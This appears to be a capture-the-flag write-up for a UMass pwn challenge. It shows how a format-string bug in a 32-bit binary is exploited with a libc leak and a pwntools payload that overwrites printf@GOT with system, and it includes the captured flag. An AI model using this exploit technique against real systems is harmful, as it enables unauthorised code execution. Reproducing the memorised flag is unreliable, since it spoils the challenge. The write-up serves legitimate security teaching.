# Brick_City_Office_Space

## Challenge Summary
- Given: a 32-bit ELF binary, matching `libc.so.6`, `ld-linux.so.2`, and a placeholder `flag.txt` inside `starting_files/brick-city-office-space.zip`.
- Goal: read the real remote `flag.txt` from `nc brick-city-office-space.pwn.ctf.umasscybersec.org 45001`.
- Constraints: NX enabled, no PIE, no RELRO, no stack canary, no direct overflow because `fgets` reads 0x250 bytes into a 0x268-byte buffer.

## Initial Recon / Triage
- Observations: both the first design input and the invalid `y/n` response are passed directly to `printf(buffer)`, creating a format-string bug.
- File identification: `BrickCityOfficeSpace` is a 32-bit dynamically linked ELF; bundled `flag.txt` contains `UMASS{example_flag}` and is only a placeholder.
- Entry points: the first `printf` happens immediately after the ASCII-art design input is echoed back into the building template.

## Hypotheses & Approach
- Hypothesis 1: leak a libc pointer from the stack with the first format string and compute the libc base using the supplied libc.
- Hypothesis 2: overwrite `printf@GOT` with `system` using the format-string write primitive, then use the redesign loop to send `cat flag.txt` as the next design input.

## Execution Steps (Reproducible)

### Stage 1
Commands:
```bash
cd /root/umass2026CTF/Brick_City_Office_Space/artifacts
file BrickCityOfficeSpace libc.so.6 ld-linux.so.2 flag.txt
checksec --file=BrickCityOfficeSpace
objdump -d -Mintel BrickCityOfficeSpace | sed -n '/<vuln>:/,/^$/p'
python3 - <<'PY'
from pwn import *
context.log_level = 'error'
p = process(['./ld-linux.so.2', '--library-path', '.', './BrickCityOfficeSpace'])
p.sendlineafter(b'BrickCityOfficeSpace> ', b'AAAABBBB.' + b'.'.join(f'%{i}$p'.encode() for i in range(1, 16)))
print(p.recvuntil(b'Would you like to redesign?').decode('latin-1', errors='replace'))
PY
```

Results:
- `vuln` uses `printf(buffer)` twice and loops on `y/Y`.
- Format-string stack positions 4 and 5 point into attacker-controlled input.
- `%2$p` leaks `_IO_2_1_stdin_`, which gives a stable libc base with the supplied libc.

### Stage 2
Commands:
```bash
cd /root/umass2026CTF/Brick_City_Office_Space/artifacts
python3 exploit.py
python3 exploit.py remote
```

Results:
- The exploit leaks `_IO_2_1_stdin_` from `%2$p`.
- It computes `libc.address = stdin_leak - libc.symbols['_IO_2_1_stdin_']`.
- It uses `fmtstr_payload(4, {elf.got['printf']: libc.symbols['system']}, write_size='short')` to redirect `printf` to `system`.
- On the next loop iteration it sends `cat flag.txt`, which is executed when the program tries to `printf` the design.
- The remote service prints the real flag.

## Artifacts Produced
- `artifacts/BrickCityOfficeSpace`
- `artifacts/libc.so.6`
- `artifacts/ld-linux.so.2`
- `artifacts/flag.txt`
- `artifacts/exploit.py`

## Flag
```text
UMASS{th3-f0rm4t_15-0ff-th3-ch4rt5}
```
